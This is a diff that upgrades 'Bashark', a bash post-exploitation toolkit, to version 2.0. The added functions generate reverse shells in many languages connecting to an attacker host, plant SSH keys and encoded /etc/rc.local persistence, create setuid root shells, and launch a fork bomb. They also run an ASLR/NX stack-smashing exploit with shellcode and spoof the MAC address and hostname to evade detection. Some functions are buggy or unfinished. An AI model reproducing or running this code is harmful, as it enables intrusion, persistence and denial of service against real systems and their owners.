@@ -1,5 +1,5 @@
 #!/bin/bash
-version="1.0"
+version="2.0"
 
 red=`tput setaf 1`
 green=`tput setaf 2`
@@ -13,14 +13,14 @@ underline=`tput smul`
 
 
 echo '
-    ____             __               __                 ___ ____ 
-   / __ )____ ______/ /_  ____ ______/ /__   _   __     <  // __ \
-  / __  / __ `/ ___/ __ \/ __ `/ ___/ //_/  | | / /     / // / / /
- / /_/ / /_/ (__  ) / / / /_/ / /  / ,<     | |/ /     / // /_/ / 
-/_____/\__,_/____/_/ /_/\__,_/_/  /_/|_|    |___(_)   /_(_)____/  
+__________               .__                  __               ________     _______   
+\______   \_____    _____|  |__ _____ _______|  | __ ___  __   \_____  \    \   _  \  
+ |    |  _/\__  \  /  ___/  |  \\__  \\_  __ \  |/ / \  \/ /    /  ____/    /  /_\  \ 
+ |    |   \ / __ \_\___ \|   Y  \/ __ \|  | \/    <   \   /    /       \    \  \_/   \
+ |______  /(____  /____  >___|  (____  /__|  |__|_ \   \_/ /\  \_______ \ /\ \_____  /
+        \/      \/     \/     \/     \/           \/       \/          \/ \/       \/ 
+
 '
-echo "${red}<.>${reset} Bashark 1.0 post exploitation script"
-echo "${red}<.>${reset} Created by: Wintrmvte"
 printf "\n"
 echo "[*] Type 'help' to show available commands"
 printf "\n"
@@ -38,6 +38,21 @@ print_error(){
 }
 print_info(){
     echo "[*]" $1
+}
+print_question(){
+	echo "[?]" $1
+}
+command_error_exit(){
+	echo "${red}${bold}[LAST CMD ERROR:$?]${reset}"
+}
+
+root_check(){
+if [[ $UID -ne 0 ]]
+then
+	print_error 'You nedd to be root to run this command'
+	echo
+	exit 1
+fi
 }
 
 PS1="${bold}bashark_$version${reset}$ "
@@ -129,9 +144,7 @@ quit(){
     if [[ "$@" =~ .*-h.* ]]; then
         echo "
         ${underline}USAGE:${reset}       
-            quit [-h] [-f]
-        ${underline}OPTIONAL ARGUMENTS:${reset}
-            -f    Launch a forkbomb after exiting
+            quit [-h] 
         ${underline}DESCRIPTION:${reset} 
             Exit Bashark, clean history and execute cleanup routine"
     else
@@ -153,10 +166,6 @@ quit(){
         done
         print_info "Removed ${bold}${removed_files}${reset} files"
         print_info "Removed ${bold}${removed_dirs}${reset} directories"
-        if [[ "$@" =~ .*-f.* ]]; then
-            print_info "Launched forkbomb..."
-            :(){ :|:& };:
-        fi 
     fi
 }
 
@@ -277,7 +286,7 @@ i(){
         fi      
 
         os=${OSSTR}
-
+		super_users=`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`
         if [[ "$root_usrs" =~ "$(whoami)" ]]; then
             is_root="(${green}Root privilleges${reset})"
         else
@@ -324,13 +333,14 @@ i(){
         echo "
         ${star}Username    : ${bold}$(whoami)${reset} ${is_root}
         ${star}User Groups : $(groups $(whoami))
+	${star}Super users : ${super_users}
         ${star}Hostname    : $(hostname)
         ${star}OS          : $os
         ${star}Kernel      : $(uname -r)
         ${star}Arch        : $(uname -m)
         ${star}Local IP    : ${local_ip}
         ${star}Global IP   : ${global_ip}
-        ${star}RAM         : 
+        ${star}RAM          
             $(cat /proc/meminfo |grep MemTotal)
             $(cat /proc/meminfo |grep MemFree)
             $(cat /proc/meminfo |grep SwapTotal)
@@ -339,12 +349,6 @@ i(){
             * ASLR          : ${aslr}
             * DMESG_RESTRICT: ${dmesg_restrict}
             * PERF_PARANOID : ${perf_paranoid}
-        ${star}Network controller:
-            $(lspci|grep Network)
-        ${star}Ethernet controller:
-            $(lspci|grep Ethernet) 
-        ${star}SATA controller:
-            $(lspci|grep SATA)    
         "
     fi
 }
@@ -478,6 +482,9 @@ isvm(){
         ${underline}DESCRIPTION:${reset} 
             Check if OS is running on virtual machine"
     else
+		if ls -di --color=never /|grep -vqe "^2.*/$"; then
+			print_info "Running in chroot"
+		fi
         if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
             print_info "Host is running on a Virtual Machine"
         else
@@ -682,7 +689,8 @@ fileinfo(){
     fi
 }
 
-fndre(){ 
+fndre(){
+	#TODO FINISH	
     if [[ "$@" =~ .*-h.* ]]; then
         echo "
         ${underline}USAGE:${reset}       
@@ -712,8 +720,9 @@ fndre(){
             regexes[JCB_regex]="35\d{14}|2131\d{11}|1800\d{11})"  
 
             for key in ${!regexes[@]}; do
+                #echo $regexes[$key]
                 print_good "$key search results:"
-                re=${regexes[$key]}
+                re=$regexes[$key]
                 grep -oE "$re" $filename
             done
         fi
@@ -801,7 +810,7 @@ cve(){
                     ["2.4.[4-37]|2.6.[15-31]"]="CVE-2009-3547" )
         kernel=`uname -r`
         for exploit in "${!exploits[@]}"; do
-            echo ${kernel}|grep -E ${exploit} > tmp
+            echo "${kernel}|grep -E ${exploit}" > tmp
             check=$?
             if [ "$check" -eq 0 ]; then
                 echo "${red}${bold}<.>${reset} ${exploits[$exploit]}" 
@@ -999,6 +1008,431 @@ EOL
     fi 
 }
 
+mod(){
+    if [[ "$@" =~ .*-h.* ]]; then
+    echo "
+        ${underline}USAGE:${reset}       
+            mod [-h] ACTION EXTENSION TEXT
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+            ACTION     Operation to perform with the text {append, prepend, replace, remove} 
+            EXTENSION  File extension
+            TEXT       Text to append to files
+        ${underline}DESCRIPTION:${reset} 
+            Modify contents of every file with specified extension in current directory"
+    else
+        if [ $# -eq 0 ]; then
+            print_error "Specify the ACTION"
+        elif [ $# -eq 1 ]; then
+            print_error "Specify the EXTENSION"
+        elif [ $# -eq 2 ]; then
+            print_error "Specify the TEXT"
+        else
+            files=`ls`
+            action=$1
+            extension=$2
+            text=$3
+            for file in ${files[*]}; do
+            	if [[ "$file" =~ .*${extension} ]]; then
+					if [ $action = "append" ]; then
+                		cat $text >> $file
+					elif [ $action = "prepend" ]; then
+						printf '%s\n%s\n' $text "$(cat $file)" > $file
+					elif [ $action = "replace" ]; then
+						echo $text > $file
+					elif [ $action = "remove" ]; then
+						sed -i '/pattern/d' $file
+					else
+                		print_error "No such action. Available choices: {append, prepend, replace}"
+					fi
+               	fi
+            done
+        fi
+    fi
+}
+
+
+getdbus(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			getdbus [-h]
+        ${underline}DESCRIPTION:${reset} 
+			List all available netbus services"
+	else
+		print_good "Dbus services for system:"
+		dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
+		print_good "Dbus services for session:"
+		dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-repl
+	fi
+
+}
+
+
+getsec(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+     echo "
+        ${underline}USAGE:${reset}       
+			getsec [-h]
+        ${underline}DESCRIPTION:${reset} 
+			List security services"
+	else
+		none=0
+		selinuxenabled >/dev/null 2>/dev/null
+ 		if echo $? | grep -q 0; then
+ 			print_error "SELinux is enabled."
+			((none++))
+ 		fi
+		type aa-status >/dev/null 2>/dev/null
+ 		if echo $? | grep -q 0; then
+ 			print_error "AppArmor is probably installed."
+			((none++))
+ 		fi
+ 		if cat /proc/self/status | grep -q PaX; then
+ 			print_error "GrSec and PaX are present"
+			((none++))
+ 		fi
+		if [ $none -eq 0 ]; then
+			print_good "No security measures detected"
+		fi
+	fi
+
+}
+
+getidle(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			getidle [-h]
+        ${underline}DESCRIPTION:${reset} 
+			Get active PTYs ant their idle time"
+	else
+		ptys=`ls /dev/pts | grep '[[:digit:]]' | sort -g | tr '\n' ' '`
+		echo $ptys | tr ' ' '\n' | while read i;do
+ 		echo -ne "[*] PTY $i has been idle for "
+ 		idler=`stat -t /dev/pts/$i | awk -F " " '{ print $12 }'`
+ 		echo -ne "$((`date +%s` - $idler)) seconds.\n"
+		done
+	fi
+
+}
+
+keyinstall(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+		${underline}USAGE:${reset}       
+			keyinstall [-h] KEY
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+            KEY    RSA key to add
+        ${underline}DESCRIPTION:${reset} 
+			Add your RSA key to list of SSH authorized keys"
+	else
+		if [ $# -eq 0 ]; then
+			print_error "Specify the KEY"
+		else
+			key=$1
+			touch /dev/shm/.q/.ssh
+			touch -r /
+			sshkey="ssh-rsa $key `whoami`@`hostname`"
+			echo $sshkey >> ~/.ssh/authorized_keys
+			print_good "Added $key to list of authorized keys"
+		fi
+	fi
+
+}
+
+revshellgen(){
+	function bash_shell(){
+		echo -e "bash -i >& /dev/tcp/$ipaddr/$port 0>&1"
+	}
+	function perl_shell(){
+ 		echo -e "perl -e 'use Socket; \$i=\"$ipaddr\" ;\$p=$port ;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+	}	
+	function python_shell(){
+ 		echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( \"$ipaddr\",$port ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	}
+	function php_shell(){
+		echo -e "php -r '\$sock=fsockopen(\" $ipaddr\",$port );exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	}
+	function ruby_shell(){
+		echo -e "ruby -rsocket -e'f=TCPSocket.open( \"$ipaddr\",$port ).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+	}
+	function netcat1_shell(){
+		echo -e "nc -e /bin/sh  $ipaddr $port \n"
+	}
+	function netcat2_shell(){ 
+ 		echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  $ipaddr $port  >/tmp/f\n"
+	}
+	function netcat3_shell(){
+        echo -e "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc  $ipaddr $port  1>/tmp/l"
+	}
+	function java_shell(){
+		echo -e """ 
+		r = Runtime.getRuntime()
+		p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ $ipaddr / $port ;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
+		p.waitFor()
+		 """
+ 	}
+	function shellshock_rce_shell(){
+		echo -e "wget -U \"() { test;};echo \"Content-type: text/plain\"; echo; echo;  YOUR_COMMAND \" http:// TARGET_IP /cgi-bin/status\n"
+	}
+ 	function shellshock_bind_shell(){
+ 		echo "echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc -l -p 4444 -e /bin/sh\\r\\nHost: <TARGET_IP>\\r\\nConnection: close\\r\\n\\r\\n\" | nc <TARGET_IP> 80"
+	}
+	function lua_shell(){
+		echo -e "lua5.1 -e 'local host,port = \" $ipaddr \", $port  local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
+	}
+	function powershell_shell(){
+    	echo -e "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\" $ipaddr \", $port );\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+	}
+	function telnet_shell(){
+		echo -e "telnet  $ipaddr $port  | /bin/bash | telnet  $ipaddr 9999 "
+	}	
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+		revshellgen [-h] [-l] TYPE LHOST LPORT
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+		-l 	   Show available reverse shells
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+		TYPE   Type of the shell to use
+		LHOST  Listening host
+		LPORT  Listening port
+        ${underline}DESCRIPTION:${reset} 
+		Output a reverse shell of chosen type"
+	elif [[ "$@" =~ .*-l.* ]]; then
+		print_good "Available reverse shells:"
+		echo "
+1) bash_shell
+2) ruby_shell
+3) perl_shell
+4) netcat1_shell
+5) netcat2_shell
+6) netcat3_shell
+7) python_shell
+8) java_shell
+9) php_shell
+10) shellshock_shell
+11) lua_shell
+12) powershell_shell
+13) telnet_shell"
+	else
+		type=$1
+		ipaddr=$2
+		port=$3
+		$type
+	fi
+}
+
+
+ldexec(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+		ldexec [-h] FILE
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+		FILE 	File to execute
+        ${underline}DESCRIPTION:${reset} 
+		Execute file without execution permission bit set"
+	else	
+		if [ $# -eq 0 ]; then
+			print_error "Specify the FILE"
+		else
+			file=$1
+			cp $file /tmp/abcde
+			chmod a-x /tmp/abcde
+			linker=`ls /lib|grep -oE "ld-linux.*.so.2"`
+			/lib/$linker /tmp/abcde
+		fi
+	fi
+
+}
+
+forkbomb(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+		forkbomb [-h] [INTERVAL]
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+		INTERVAL 	Number of seconds of optional delay
+        ${underline}DESCRIPTION:${reset} 
+		Run a forkbomb"
+	else
+		if [ $# -eq 1 ]; then
+			delay=$1
+			sleep $delay
+		else
+			:(){ :|:& };:
+		fi
+	fi
+}
+
+machange(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			machange [-h] [IFACE] [MAC]
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+		IFACE 	Interface to change address on
+		MAC 	New MAC adderss				
+        ${underline}DESCRIPTION:${reset} 
+			Change MAC address"
+	else
+		if [ $# -eq 0 ]; then
+			print_error "Not enough arguments"
+		elif [ $# -eq 1 ]; then
+			iface=$1
+		elif [ $# -eq 2 ]; then
+			mac=$2
+		else
+			iface="eth0"
+		fi
+		/etc/init.d/networking stop
+		ifconfig $iface hw ether $mac
+		/etc/init.d/networking start
+		if [ $# -eq 0 ]; then
+			print_good "Changed mac address to $mac"
+		fi
+	fi
+}
+
+
+aslray(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			aslray BINARY BUFSIZE [SHELLCODE]
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+			INTERFACE 	Interface to perform stealthing on						
+			BUFSIZE		Buffer to pass as an argument
+			SHELLCODE  	Shellcode to execute (default: spawn shell)
+        ${underline}DESCRIPTION:${reset} 
+			ALSR and DEP/NX bypass for x86/x86_64 (stack smashing) "
+	else
+        if [ $# -eq 0 ]; then
+            print_error "Specify BINARY"
+        elif [ $# -eq 1 ]; then
+            print_error "Specify BUFSIZE"
+		else
+			FILE=$1
+			BUFFER=$2
+			SC=$3
+			x86=$(file $FILE | grep '32-bit')
+			if [[ "$x86" ]]; then
+				print_info 'ELF IS 32-BIT'
+				if [[ `readelf -l $FILE | grep RWE` ]]; then
+					print_info 'STACK IS EXECUTABLE'
+					print_info 'SPRAYING NOPSLED AND SHELLCODE...'
+					if [[ "$SC" != "" ]]
+					then
+						SC=$(echo $SC | sed s/x/\\\\x/g)
+						export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne $SC)
+					else
+						export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
+					fi
+					print_info 'EXPLOITING...'
+					$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')
+					while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x80\x80\xfc\xff') ; done
+				else
+					print_good 'DEP/NX DETECTED'
+					pprint_info 'SPRAYING SHELL...'
+								export shell0=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell1=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell2=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell3=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell4=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell5=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell6=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell7=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell8=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+								export shell9=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
+					print_info 'EXPLOITING... may take a while, if stuck then retry'
+					sleep 2
+					TYPE=/etc/os-release
+					if [[ `grep jessie $TYPE` ]]
+					then
+								while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\xe0\x83\x58\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
+		# TODO use 'timeout 1 $FILE' in order not to stuck, but how to spawn a shell?
+					elif [[ `grep stretch $TYPE` ]]
+					then
+								while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x40\xe8\x62\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
+					elif [[ `grep Xenial $TYPE` ]]
+					then
+								while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x40\xe9\x63\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
+					elif [[ `grep Trusty $TYPE` ]]
+					then
+								while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x70\xce\x56\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
+					else
+						 'NOT DEBIAN OR UBUNTU!!!'
+						exit 2
+					fi
+				fi
+				print_info "Retry if the shellcode wasn't executed until now"
+			else
+				print_info 'ELF IS 64-BIT'
+				print_info 'SPRAYING NOPSLED AND SHELLCODE...'
+				if [[ "$SC" != "" ]]
+				then
+					SC=$(echo $SC | sed s/x/\\\\x/g)
+					for n in {1..10} ; do export SHELLCODE$n=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne $SC); done
+				else
+					for n in {1..10} ; do export SHELLCODE$n=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'); done
+				fi
+				print_good 'EXPLOITING... may take a while'
+				while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -ne '\x80\x80\x80\x80\xfc\x7f') ; done
+			fi
+	fi
+				
+fi
+}
+
+
+uperm(){ #FINISH THIS
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			uperm [-h] 
+        ${underline}DESCRIPTION:${reset} 
+			Show files permissions for current user"
+	else
+		:
+	fi
+}
+
+watch(){
+:
+}
+
+shellshock(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			shellshock [-h] 
+        ${underline}DESCRIPTION:${reset} 
+			Check for shellshock vulnerabilities"
+	else
+		hits=0
+		env X='() { :; }; echo "${green}${bold}}CVE-2014-6271${reset}"' bash -c id
+		if [ $# -eq 0 ]; then
+			print_error "Check #1 - not vulnerable"
+		fi
+		env X='() { (a)=>\' bash -c "${green}${bold}CVE-2014-7169${reset}"; cat echo
+		if [ $# -eq 0 ]; then
+			print_error "Check #2 - not vulnerable"
+		fi
+		bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "${green}${bold}CVE-2014-7186${reset}"
+		(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "${green}${bold}CVE-2014-7187${reset}"
+		if [ $# -eq 0 ]; then
+			print_error "Check #3 - not vulnerable"
+		fi
+		env X='() { _; } >_[$($())] { echo ${green}${bold}CVE-2014-6278${reset}; id; }' bash -c :
+		if [ $# -eq 0 ]; then
+			print_error "Check #4 - not vulnerable"
+		fi
+
+	fi
+}
+
+
 ###Commands that require root
 portblock(){
     if [[ "$@" =~ .*-h.* ]]; then 
@@ -1011,24 +1445,21 @@ portblock(){
         ${underline}DESCRIPTION:${reset} 
             Block all ports on localhost except whitelisted in 'PORTS' option"
     else
+		root_check()
         if hash iptables 2>/dev/null; then
-            if [ "$EUID" -ne 0 ]; then
-                print_error "You have to be root"
-            else
-                if [ $# -eq 0 ]; then
-                    print_error "Specify IFACE and PORTS"
-                elif [ $# -eq 1 ]; then
-                    print_error "Specify PORTS"
-                else
-                    iface="eth0"
-                    sudo iptables -P INPUT DROP
-                    IFS=',' read -ra PORTS <<< "$ports"
-                    for port in ${PORTS[*]}; do
-                        iptables -A INPUT -i $iface -p tcp --dport $port -j ACCEPT #Check this shit
-                    done
-                    print_good "Blocked all ports except whitelisted"
-                fi
-            fi
+			if [ $# -eq 0 ]; then
+				print_error "Specify IFACE and PORTS"
+			elif [ $# -eq 1 ]; then
+				print_error "Specify PORTS"
+			else
+				iface="eth0"
+				sudo iptables -P INPUT DROP
+				IFS=',' read -ra PORTS <<< "$ports"
+				for port in ${PORTS[*]}; do
+					iptables -A INPUT -i $iface -p tcp --dport $port -j ACCEPT #Check this shit
+				done
+				print_good "Blocked all ports except whitelisted"
+			fi
         else
             print_error "Unable to perform port blocking: iptables is not installed"
         fi
@@ -1049,19 +1480,16 @@ persist(){
         if [ $# -eq 0 ]; then
             print_error "Specify the command"
         else
-            if [ "$EUID" -ne 0 ]; then
-                print_error "You have to be root"
-            else
-                command=$1
-                encode_cmd="echo -n '$command' | base64"
-                encoded=$(eval "$encode_cmd")
-                decode_cmd="echo -n '$encoded' | base64 -d"
-		decoder="$""(eval ""$decode_cmd)"
-                sudo echo $decoder >> /etc/rc.local
-                print_good "Appended encoded command to /etc/rc.local"
-            fi
-        fi
-    fi
+			root_check
+			command=$1
+			encode_cmd="echo -n '$command' | base64"
+			encoded=$(eval "$encode_cmd")
+			decode_cmd="echo -n '$encoded' | base64 -d"
+			decoder="$""(eval ""$decode_cmd)"
+			sudo echo $decoder >> /etc/rc.local
+			print_good "Appended encoded command to /etc/rc.local"
+         fi
+ 	fi
 }
 
 rootshell(){
@@ -1072,16 +1500,13 @@ rootshell(){
         ${underline}DESCRIPTION:${reset} 
             Create a rootshell binary under /tmp directory"
     else
-        if [ "$EUID" -ne 0 ]; then
-            print_error "You have to be root"
-        else
-            local shellfile=${1-$SHELL}
-            local rootshell=${2-$(mktemp -u)}         
-            cp "$shellfile" "$rootshell"
-            chmod u+s "$rootshell"
-            print_good "Created a rootshell"
-            ls -la "$rootshell"
-        fi
+		root_check
+		local shellfile=${1-$SHELL}
+		local rootshell=${2-$(mktemp -u)}         
+		cp "$shellfile" "$rootshell"
+		chmod u+s "$rootshell"
+		print_good "Created a rootshell"
+		ls -la "$rootshell"
     fi
 }
 
@@ -1095,6 +1520,7 @@ usradd(){
         ${underline}DESCRIPTION:${reset}
             Create a new hidden root user on host (currently OSX only)"
     else
+		root_check()
         if [ $# -eq 0 ]; then
             print_error "Specify the username"
         else
@@ -1112,10 +1538,231 @@ usradd(){
     fi
 }
 
+swapdump(){
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            swapdump [-h] 
+        ${underline}DESCRIPTION:${reset}
+			Search for in-memory credentials"
+    else
+		root_check
+	fi
+	
+}
+
+forward(){
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            forward [ssh|ssh_vpn] USERNAME HOST PORT 
+        ${underline}DESCRIPTION:${reset}
+			Perform ssh port forwarding
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            USERNAME    Name of the ssh user
+	    HOST 		Target ip
+	    PORT		Port to forward
+			"
+    else
+		root_check()
+        if [ $# -eq 0 ]; then
+            print_error "Specify mode"
+        elif [ $# -eq 1 ]; then
+            print_error "Specify USERNAME"
+        elif [ $# -eq 2 ]; then
+            print_error "Specify HOST"
+        elif [ $# -eq 3 ]; then
+            print_error "Specify PORT"
+        else
+		mode=$1
+		username=$2
+		host=$3
+		port=$4
+		if [ $1 == "ssh" ]; then
+			ssh $username@$host -L $port:$host:$port
+			if [ $# -eq 0 ]; then
+				print_good "Port forward performed succesfully"
+			else
+				command_error_exit
+			fi
+		elif [ $1 == "ssh_vpn" ]; then
+			:
+		else
+			print_error "No such option"
+			fi
+		fi
+	fi
+
+
+}
+
+ghost(){
+	if [[ "$@" =~ .*-h.* ]]; then 
+    echo "
+        ${underline}USAGE:${reset}       
+			ghost on|off [INTERFACE]
+        ${underline}POSITIONAL ARGUMENTS:${reset}
+			INTERFACE 	Interface to perform stealthing on						
+        ${underline}DESCRIPTION:${reset} 
+			Disappear from the net"
+	else
+		root_check()
+        if [ $# -eq 1 ]; then
+			iface="eth0"
+		elif [ $# -eq 2 ]; then
+			iface=$2
+		fi
+        if [ $# -eq 0 ]; then
+            print_error "Specify the switch [on|off]"
+		else
+		SWITCH=$1
+		INTERFACE=$2
+		TMPMAC=/tmp/mac.ghost
+		ORGHOST=/tmp/host.ghost
+		ORGMAC=""
+		CMD=$( which ifconfig 2>/dev/null)
+		if [[ $? -gt 0 ]]; then
+			CMD=$( which ip )
+		fi
+		if [[ "$SWITCH" = "on" ]]
+		then
+			if [ ! $(which ethtool) ] && [ ! -f /etc/udev/rules.d/70-persistent-net.rules ]
+			then
+				if [[ $CMD =~ .*ifconfig ]]; then
+					ORGMAC=$( $CMD $INTERFACE | grep ether | awk '{print $2}' )
+				else
+					ORGMAC=$( $CMD link show $INTERFACE | awk '$1~/^link/{print $2}' )
+				fi
+			else
+				if [[ $(which ethtool) ]]
+				then
+					ORGMAC=$(ethtool -P $INTERFACE)
+					ORGMAC=${ORGMAC#*:}
+				else
+					ORGMAC=$(cat /etc/udev/rules.d/70-persistent-net.rules | grep $INTERFACE | cut -d '"' -f 8)
+				fi
+			fi
+			echo -n $ORGMAC > $TMPMAC
+			print_info 'Spoofing MAC address ...'
+			/etc/init.d/network-manager stop &>/dev/null
+			if [[ $CMD =~ .*ifconfig ]]; then
+				$CMD $INTERFACE down
+			else
+				$CMD link set $INTERFACE down
+			fi
+			if [[ $? -ne 0 ]]
+			then
+				print_error "Wrong interface"
+				exit 3
+			fi
+			MAC=$(head -c 6 /proc/sys/kernel/random/uuid | sed 's/^\(..\)\(..\)\(..\).*$/48:0f:cf:\1:\2:\3/')
+			if [[ $CMD =~ .*ifconfig ]]; then
+				$CMD $INTERFACE hw ether $MAC
+			else
+				$CMD link set dev $INTERFACE address $MAC
+			fi
+			print_good "New MAC address: $MAC"
+			print_info 'Configuring kernel to restrict ARP/NDP requests in linking network mode ...'
+			sysctl net.ipv4.conf.$INTERFACE.arp_ignore=8 > /dev/null
+			sysctl net.ipv4.conf.$INTERFACE.arp_announce=2 > /dev/null
+			ip6tables -I INPUT 1 -i $INTERFACE --protocol icmpv6 --icmpv6-type echo-request -j DROP
+			ip6tables -I INPUT 2 -i $INTERFACE --protocol icmpv6 --icmpv6-type neighbor-solicit -j DROP
+			print_info 'Reinitializing network interface ...'
+			print_info 'If not connected or taking too long - reconnect manually'
+			if [[ $CMD =~ .*ifconfig ]]; then
+				$CMD $INTERFACE up
+			else
+				$CMD link set $INTERFACE up
+			fi
+				/etc/init.d/network-manager start &>/dev/null
+			hostname > $ORGHOST
+			hostnamectl set-hostname $RANDOM
+			print_good 'New hostname : '$(hostname)
+			xauth add $(hostname)/$(xauth list | cut -d '/' -f 2 | tail -n 1)
+			chown $(echo $XAUTHORITY | cut -d '/' -f 3): $XAUTHORITY 2>/dev/null
+			print_question 'Perform DHCP (unless you want to specify your own IP)? (y/n)'
+			read dhcp
+			dhcp=${dhcp,,*}
+			dhcp=${dhcp::1}
+			if [[ "$dhcp" = "y" ]]
+			then
+				dhclient $INTERFACE &> /dev/null
+			fi
+			if [[ $CMD =~ .*ip ]]
+			then
+				print_info 'Erasing previous IP...'
+				sleep 4
+				$CMD addr del $(ip addr show dev $INTERFACE | grep second | cut -d ' ' -f 6 | cut -d '/' -f 1) dev $INTERFACE
+			fi
+			print_good "{magenta}Ghost mode enabled{reset}"
+		elif [[ "$SWITCH" = "off" ]]
+		then
